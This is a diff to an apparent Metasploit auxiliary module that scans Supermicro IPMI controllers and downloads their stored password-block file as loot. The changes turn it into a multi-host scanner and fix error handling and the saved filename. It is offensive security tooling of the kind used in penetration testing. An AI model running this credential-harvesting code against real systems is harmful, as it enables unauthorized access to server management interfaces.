@@ -9,7 +9,9 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  
 
   def initialize(info = {})
     super(update_info(info,
@@ -33,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
         ],
-      'DisclosureDate' => 'Jun XX 2014'))
+      'DisclosureDate' => 'Jun 12 2014'))
 
     register_options(
       [
@@ -64,8 +66,8 @@ class Metasploit3 < Msf::Auxiliary
   end
 
 
-  def run
-   
+  def run_host(ip)
+
     unless is_supermicro?
       print_error("#{peer} - This does not appear to be a Supermicro IPMI controller")
       return
@@ -80,9 +82,11 @@ class Metasploit3 < Msf::Auxiliary
           "method"    => "GET"
         })
 
+      next unless res
+
       unless res.code == 200 and res.body.length > 0
-        print_error("#{peer} - Could not download the PSBlock file")
-        return
+        vprint_status("#{peer} - Request for #{uri} resulted in #{res.code}")
+        next
       end
 
       path = store_loot(
@@ -90,7 +94,7 @@ class Metasploit3 < Msf::Auxiliary
         'application/octet-stream',
         rhost,
         res.body.to_s,
-        path.split('/').last
+        uri.split('/').last
       )
       print_good("#{peer} - Stored password block found at #{uri} in #{path}")
     end
